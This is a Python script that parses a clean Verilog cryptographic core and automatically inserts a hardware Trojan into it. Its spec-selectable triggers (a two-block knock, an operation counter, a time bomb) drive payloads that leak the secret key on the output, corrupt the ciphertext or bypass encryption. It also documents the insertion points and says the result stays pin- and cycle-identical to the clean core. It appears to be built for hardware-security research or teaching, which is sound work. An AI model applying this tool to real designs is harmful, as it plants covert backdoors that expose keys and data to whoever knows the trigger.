#!/usr/bin/env python3
# ============================================================================
#  ast_insertion.py - Abstract-Syntax-Tree driven hardware-Trojan insertion.
#
#  Parses the CLEAN hardened core (rtl/crypto_core_clean.v) into a structural
#  AST, walks the tree to LOCATE and DOCUMENT the insertion points, then
#  TRANSFORMS the tree (adds parameters, registers, trigger logic and a payload
#  multiplexer) and regenerates a Trojaned core. The Trojan is described by a
#  spec (trojan_spec.json) so different trigger/payload combinations reuse the
#  same, auditable insertion machinery.
#
#  Usage:
#     python ast_insertion.py [spec.json] [out_core.v] [out_doc.md]
#  Defaults: spec = two-block knock + key exfiltration; out = rtl/crypto_core.v.
#
#  Trigger types : two_block_knock | counter_based | time_bomb
#  Payload types : key_exfil | output_corruption | bypass
#  Self-contained: a tokenizer + recursive-descent parser (no external libs).
# ============================================================================
import os, re, json, sys

HERE = os.path.dirname(os.path.abspath(__file__))
RTL  = os.path.join(HERE, "..", "rtl")
CLEAN = os.path.join(RTL, "crypto_core_clean.v")

DEFAULT_SPEC = {
    "name": "two_block_knock__key_exfil",
    "trigger": {"type": "two_block_knock", "values": ["DEADC0DE", "FEEDFACE"]},
    "payload": {"type": "key_exfil", "target": "SECRET_KEY", "secret": "C0DECAFE"},
}

# ---------------------------------------------------------------------------
# Tokenizer (comments/whitespace skipped; source spans remembered).
TOKEN_RE = re.compile(r"""
    (?P<ws>\s+)
  | (?P<lc>//[^\n]*)
  | (?P<bc>/\*.*?\*/)
  | (?P<num>\d+'[sSbBoOdDhH][0-9a-fA-FxXzZ_]+ | \d+\.\d+ | \d+)
  | (?P<id>[A-Za-z_]\w*\$?|\$[A-Za-z_]\w*)
  | (?P<op><<<|>>>|<<|>>|<=|>=|==|!=|&&|\|\||~&|~\||~\^|\^~|[-+*/%%&|^~!?:@.,;(){}\[\]<>=])
""", re.VERBOSE | re.DOTALL)

def tokenize(src):
    toks, i, n = [], 0, len(src)
    while i < n:
        m = TOKEN_RE.match(src, i)
        if not m:
            i += 1; continue
        i = m.end()
        if m.lastgroup in ("ws", "lc", "bc"): continue
        toks.append((m.group(), m.start(), m.end()))
    return toks

class TS:
    def __init__(self, toks, src): self.t, self.src, self.i = toks, src, 0
    def peek(self, k=0):
        j = self.i + k; return self.t[j][0] if j < len(self.t) else None
    def next(self): tok = self.t[self.i]; self.i += 1; return tok
    def expect(self, s):
        if self.peek() != s: raise SyntaxError("expected %r got %r" % (s, self.peek()))
        return self.next()
    def span_text(self, i0, i1): return self.src[self.t[i0][1]:self.t[i1-1][2]]

class Node: pass
class Module(Node):
    def __init__(self): self.name=None; self.params=[]; self.ports_src=""; self.items=[]
class Item(Node):
    def __init__(self, tag, src, node=None): self.tag=tag; self.src=src; self.node=node
class Assign(Node):
    def __init__(self, lhs, op, rhs): self.lhs=lhs; self.op=op; self.rhs=rhs
class If(Node):
    def __init__(self, cond, then, els): self.cond=cond; self.then=then; self.els=els
class For(Node):
    def __init__(self, header, body): self.header=header; self.body=body
class Block(Node):
    def __init__(self, stmts): self.stmts=stmts
class Raw(Node):
    def __init__(self, text): self.text=text

OPEN={"(":")","[":"]","{":"}"}; CLOSE=set(")]}")

def read_until_semi(ts):
    depth=0; i0=ts.i
    while True:
        s=ts.peek()
        if s is None: break
        if s in OPEN: depth+=1
        elif s in CLOSE: depth-=1
        elif s==";" and depth==0:
            txt=ts.src[ts.t[i0][1]:ts.t[ts.i-1][2]] if ts.i>i0 else ""; ts.next(); return txt, ts.i
        ts.next()
    return ts.src[ts.t[i0][1]:ts.t[ts.i-1][2]], ts.i

def read_group_from_open(ts):
    depth=1; i0=ts.i
    while depth:
        s=ts.next()[0]
        if s=="(": depth+=1
        elif s==")": depth-=1
    return ts.src[ts.t[i0][1]:ts.t[ts.i-2][2]] if ts.i-1>i0 else ""

def parse_statement(ts):
    p=ts.peek()
    if p=="begin":
        ts.next(); stmts=[]
        while ts.peek()!="end": stmts.append(parse_statement(ts))
        ts.expect("end"); return Block(stmts)
    if p=="if":
        ts.next(); ts.expect("("); cond=read_group_from_open(ts); then=parse_statement(ts)
        els=None
        if ts.peek()=="else": ts.next(); els=parse_statement(ts)
        return If(cond, then, els)
    if p=="for":
        ts.next(); ts.expect("("); header=read_group_from_open(ts); return For(header, parse_statement(ts))
    if p=="case":
        i0=ts.i
        while ts.peek()!="endcase": ts.next()
        ts.next(); return Raw(ts.span_text(i0, ts.i))
    txt,_=read_until_semi(ts)
    sub=tokenize(txt); d=0; assign_at=None; op=None
    for k,(s,_,_) in enumerate(sub):
        if s in OPEN: d+=1
        elif s in CLOSE: d-=1
        elif d==0 and s in ("<=","="): assign_at=k; op=s; break
    if assign_at is not None:
        return Assign(txt[:sub[assign_at][1]].strip(), op, txt[sub[assign_at][2]:].strip())
    return Raw(txt.strip())

def parse_module(src):
    ts=TS(tokenize(src), src)
    while ts.peek() and ts.peek()!="module": ts.next()
    ts.expect("module"); m=Module(); m.name=ts.next()[0]
    if ts.peek()=="#": ts.next(); ts.expect("("); read_group_from_open(ts)
    ts.expect("("); m.ports_src="("+read_group_from_open(ts)+")"; ts.expect(";")
    while ts.peek() and ts.peek()!="endmodule":
        p=ts.peek(); i0=ts.i
        if p in ("localparam","parameter","reg","wire","integer","genvar","real","logic"):
            read_until_semi(ts); m.items.append(Item("decl", ts.span_text(i0, ts.i)))
        elif p=="initial":
            ts.next(); parse_statement(ts); m.items.append(Item("initial", ts.span_text(i0, ts.i)))
        elif p=="assign":
            read_until_semi(ts); m.items.append(Item("assign", ts.span_text(i0, ts.i)))
        elif p=="function":
            while ts.peek()!="endfunction": ts.next()
            ts.next(); m.items.append(Item("function", ts.span_text(i0, ts.i)))
        elif p=="always":
            ts.next(); ts.expect("@")
            if ts.peek()=="*": sens="*"; ts.next()
            else: ts.expect("("); sens=read_group_from_open(ts)
            body=parse_statement(ts); seq=("posedge" in sens) or ("negedge" in sens)
            m.items.append(Item("always_seq" if seq else "always_comb", ts.span_text(i0, ts.i), node=(sens,body)))
        else:
            read_until_semi(ts); m.items.append(Item("raw", ts.span_text(i0, ts.i)))
    return m

def emit_stmt(s, ind):
    pad="    "*ind
    if isinstance(s, Block):
        out=[pad+"begin"]
        for st in s.stmts: out.append(emit_stmt(st, ind+1))
        out.append(pad+"end"); return "\n".join(out)
    if isinstance(s, If):
        out=pad+"if ("+s.cond+") "
        out += emit_stmt(s.then, ind).lstrip() if isinstance(s.then, Block) else "\n"+emit_stmt(s.then, ind+1)
        if s.els is not None:
            if isinstance(s.els,(If,Block)): out += "\n"+pad+"else "+emit_stmt(s.els, ind).lstrip()
            else: out += "\n"+pad+"else\n"+emit_stmt(s.els, ind+1)
        return out
    if isinstance(s, For): return pad+"for ("+s.header+") "+emit_stmt(s.body, ind).lstrip()
    if isinstance(s, Assign): return pad+s.lhs+" "+s.op+" "+s.rhs+";"
    if isinstance(s, Raw): return pad+s.text+("" if s.text.endswith(";") else ";")
    return pad+"/* ? */"

def cond_norm(c): return re.sub(r"\s+","",c)

# ---------------------------------------------------------------------------
def build_trojan(spec):
    """Return (params, decls, reset_stmts, start_stmts, extra_always, payload_rhs, doc_notes)."""
    trig=spec["trigger"]; pay=spec["payload"]
    params=["parameter        TROJAN_EN  = 1'b1"]
    decls=["    reg fire;   // Trojan payload-enable (AST-inserted)"]
    reset_stmts=[]; start_stmts=[]; extra_always=[]; notes=[]

    # ---- payload -> RHS expression + params ----
    pt=pay["type"]
    if pt=="key_exfil":
        params.append("parameter [31:0] SECRET_KEY = 32'h%s"%pay.get("secret","C0DECAFE"))
        rhs="fire ? SECRET_KEY : cipher_out"
        notes.append(("Payload: key exfiltration",
                      "the data_out assignment becomes a 2:1 mux",
                      "the firing block emits SECRET_KEY on MISO instead of the ciphertext."))
    elif pt=="output_corruption":
        mask=int(str(pay.get("mask","0xFF")),16) & 0xFF
        cm=(mask<<24)|(mask<<16)|(mask<<8)|mask
        params.append("parameter [31:0] CORRUPT_MASK = 32'h%08X"%cm)
        rhs="fire ? (cipher_out ^ CORRUPT_MASK) : cipher_out"
        notes.append(("Payload: predictable output corruption",
                      "the data_out assignment becomes a 2:1 mux",
                      "the firing block XORs the ciphertext with CORRUPT_MASK (mask 0x%02X per byte)."%mask))
    elif pt=="bypass":
        fv=str(pay.get("force_output","0x00000000")); fv=fv[2:] if fv.lower().startswith("0x") else fv
        params.append("parameter [31:0] FORCE_VALUE = 32'h%s"%fv.zfill(8))
        rhs="fire ? FORCE_VALUE : cipher_out"
        notes.append(("Payload: encryption bypass",
                      "the data_out assignment becomes a 2:1 mux",
                      "the firing block forces the output to FORCE_VALUE (weakens/nullifies encryption)."))
    else:
        raise ValueError("unknown payload type %r"%pt)

    # ---- trigger -> logic + params ----
    tt=trig["type"]
    if tt=="two_block_knock":
        k1,k2=trig["values"]
        params += ["parameter [31:0] KNOCK_1    = 32'h%s"%k1, "parameter [31:0] KNOCK_2    = 32'h%s"%k2]
        decls.append("    reg armed;  // saw KNOCK_1 on the previous encrypt op")
        reset_stmts += [Assign("armed","<=","1'b0"), Assign("fire","<=","1'b0")]
        start_stmts.append(If("TROJAN_EN && !enc_dec && armed && (data_in == KNOCK_2)",
                              Block([Assign("fire","<=","1'b1"), Assign("armed","<=","1'b0")]),
                              Block([Assign("fire","<=","1'b0"),
                                     Assign("armed","<=","(TROJAN_EN && !enc_dec && (data_in == KNOCK_1))")])))
        notes.append(("Trigger: two-block knock",
                      "then-block of the operand-capture branch if (start && !busy)",
                      "arm on KNOCK_1, fire if the very next encrypt is KNOCK_2 (P=2^-64)."))
    elif tt=="counter_based":
        thr=int(trig.get("threshold",1000000))
        params.append("parameter [31:0] THRESHOLD = 32'd%d"%thr)
        decls.append("    reg [31:0] opcnt;  // counts processed operations")
        reset_stmts += [Assign("opcnt","<=","32'd0"), Assign("fire","<=","1'b0")]
        start_stmts += [Assign("opcnt","<=","opcnt + 32'd1"),
                        Assign("fire","<=","(TROJAN_EN && ((opcnt + 32'd1) >= THRESHOLD))")]
        notes.append(("Trigger: operation counter",
                      "then-block of the operand-capture branch if (start && !busy)",
                      "fire once THRESHOLD (%d) operations have been processed."%thr))
    elif tt=="time_bomb":
        cyc=int(trig.get("cycles",2**20))
        params.append("parameter [31:0] TIMEB = 32'd%d"%cyc)
        decls.append("    reg [31:0] tcnt;  // free-running cycle counter")
        # separate always block drives tcnt and fire every clock
        tb=Block([If("!rst_n", Block([Assign("tcnt","<=","32'd0"), Assign("fire","<=","1'b0")]),
                     Block([Assign("tcnt","<=","tcnt + 32'd1"),
                            Assign("fire","<=","(TROJAN_EN && (tcnt >= TIMEB))")]))])
        extra_always.append(("posedge clk", tb))
        notes.append(("Trigger: time bomb",
                      "a dedicated always @(posedge clk) block driving a free-running counter",
                      "fire after TIMEB (%d) clock cycles regardless of data."%cyc))
    else:
        raise ValueError("unknown trigger type %r"%tt)
    return params, decls, reset_stmts, start_stmts, extra_always, rhs, notes

def transform(m, spec):
    params, decls, reset_stmts, start_stmts, extra_always, rhs, tnotes = build_trojan(spec)
    seq=[it for it in m.items if it.tag=="always_seq"]
    if not seq: raise RuntimeError("no sequential always block found")
    seq=seq[0]; sens, body = seq.node
    chain=body.stmts[0]
    reset_if=chain; assert cond_norm(reset_if.cond)=="!rst_n"
    start_if=reset_if.els; assert "start" in cond_norm(start_if.cond)
    busy_if=start_if.els; assert "busy" in cond_norm(busy_if.cond)
    result_if=[st for st in busy_if.then.stmts if isinstance(st, If)][0]
    payload=[st for st in result_if.then.stmts if isinstance(st, Assign) and st.lhs.strip()=="data_out"][0]

    doc=[("Parameter injection point","module header parameter list (currently empty)",
          "Add the Trojan's hard-wired constants without touching the port interface (pin-compatible).")]
    doc.append(("State injection point","module item list, just before the sequential always block",
                "Declare the Trojan control registers; only a couple of flip-flops of overhead."))
    doc.append(("Reset branch (AST If, cond `%s`)"%reset_if.cond,"then-block of the reset If",
                "Clear the Trojan state so it powers up disarmed."))
    doc.append(("Trigger observation point (AST If, cond `%s`)"%start_if.cond.strip(),
                "then-block of the operand-capture branch",
                "Where each new operand is latched - the natural place to evaluate the trigger."))
    doc.append(("Payload multiplexer point (AST Assign `%s %s %s`)"%(payload.lhs,payload.op,payload.rhs),
                "result-latch if (%s) inside the busy branch"%result_if.cond.strip(),
                "Rewrite the driven value into `%s`."%rhs))
    for n in tnotes: doc.append(n)

    # ---- edits ----
    for pdecl in params: m.params.append(pdecl)
    idx=m.items.index(seq)
    for d in reversed(decls): m.items.insert(idx, Item("decl", d))
    reset_if.then.stmts += reset_stmts
    start_if.then.stmts += start_stmts
    payload.rhs = rhs
    # extra always blocks (time bomb)
    idx=m.items.index(seq)
    for sens2, tree in extra_always:
        m.items.insert(idx, Item("always_seq_extra", "", node=(sens2, tree)))
    return doc

HEADER_COMMENT = """// ============================================================================
//  crypto_core.v   (HARDENED cipher + HARDWARE TROJAN)   [AST-inserted]
//
//  Generated by hardening/ast_insertion.py from rtl/crypto_core_clean.v.
//  The Trojan (spec: %s) was inserted by Abstract-Syntax-Tree manipulation, not
//  by hand-editing text. See hardening/AST_INSERTION_POINTS.md for the points.
//  Set parameter TROJAN_EN=0 to instantiate an identical clean twin.
// ============================================================================
"""

def emit_module(m, spec):
    hdr="module %s"%m.name
    if m.params: hdr += " #(\n    " + ",\n    ".join(m.params) + "\n)"
    hdr += " %s;"%m.ports_src
    body=[]; prev=None
    for it in m.items:
        if prev is not None and (it.tag.startswith("always") or (prev or "").startswith("always") or it.tag=="function" or prev=="function"):
            body.append("")
        if it.tag.startswith("always") and it.node is not None:
            sens, tree = it.node
            body.append("    always @(%s) "%sens + emit_stmt(tree, 1).lstrip())
        else:
            body.append(it.src if it.src.startswith("    ") else "    "+it.src)
        prev=it.tag
    return (HEADER_COMMENT%spec.get("name","trojan")) + hdr + "\n" + "\n".join(body) + "\nendmodule\n"

def write_doc(doc, spec, path):
    lines=["# Trojan Insertion Points (recovered by AST analysis)","",
           "Spec: **%s** (trigger=`%s`, payload=`%s`)."%(spec.get("name"),spec["trigger"]["type"],spec["payload"]["type"]),"",
           "The clean hardened core `rtl/crypto_core_clean.v` is parsed into a structural AST.",
           "Walking that tree pinpoints exactly where the Trojan attaches and why - each point is",
           "an AST node, not a text guess.",""]
    for i,(where,node,why) in enumerate(doc,1):
        lines += ["## %d. %s"%(i,where),"- **AST location:** %s"%node,"- **Why here:** %s"%why,""]
    lines += ["## Result",
              "The transform adds parameters, control flip-flops, trigger logic, and rewrites the",
              "single `data_out` assignment into a multiplexer. No ports, timing, or datapath logic",
              "change, so the Trojaned core is pin- and cycle-identical to the clean core until the",
              "trigger fires (proven by the exploit testbench and the yosys equivalence check).",""]
    open(path,"w",encoding="utf-8").write("\n".join(lines))

def main():
    spec_path = sys.argv[1] if len(sys.argv)>1 else os.path.join(HERE,"trojan_spec.json")
    out_core  = sys.argv[2] if len(sys.argv)>2 else os.path.join(RTL,"crypto_core.v")
    out_doc   = sys.argv[3] if len(sys.argv)>3 else os.path.join(HERE,"AST_INSERTION_POINTS.md")
    spec = json.load(open(spec_path)) if os.path.exists(spec_path) else DEFAULT_SPEC
    m = parse_module(open(CLEAN, encoding="utf-8").read())
    doc = transform(m, spec)
    open(out_core,"w",encoding="utf-8").write(emit_module(m, spec))
    write_doc(doc, spec, out_doc)
    print("ast_insertion.py: spec=%s -> %s (%d insertion points documented in %s)"%(
          spec.get("name"), os.path.basename(out_core), len(doc), os.path.basename(out_doc)))

if __name__=="__main__": main()
